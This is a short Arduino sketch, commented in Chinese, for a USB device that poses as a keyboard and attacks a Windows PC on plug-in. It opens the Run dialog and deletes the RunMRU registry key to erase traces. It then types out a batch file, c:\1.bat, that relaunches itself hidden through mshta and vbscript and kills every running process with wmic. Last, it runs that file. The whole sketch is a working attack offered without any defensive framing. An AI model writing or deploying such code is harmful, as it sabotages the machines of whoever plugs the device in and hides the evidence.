void setup() {//初始化
  Keyboard.begin();//开始键盘通讯 
  delay(5000);//延时
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("cmd.exe /k reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f");
  delay(500);
  Keyboard.println("echo.if \"%1\" == \"h\" goto begin>c:\\1.bat&echo.mshta vbscript:createobject(\"wscript.shell\").run(\"%~nx0 h\",0)(window.close)^&^&exit>>c:\\1.bat&echo.:begin>>c:\\1.bat&echo.ping ^-n 3 127.1^>nul^&for /f %%I in ('wmic process get Name')do (wmic process where Name=\"%%I\" delete)^>c:\\1.vbs^&c:\\1.vbs>>c:\\1.bat&exit");
  Keyboard.press(KEY_LEFT_GUI);//win键 
  delay(500); 
  Keyboard.press('r');//r键 
  delay(500); 
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500); 
  Keyboard.println("c:\\1.bat");
  Keyboard.end();//结束键盘通讯 
}
void loop()//循环
{
}
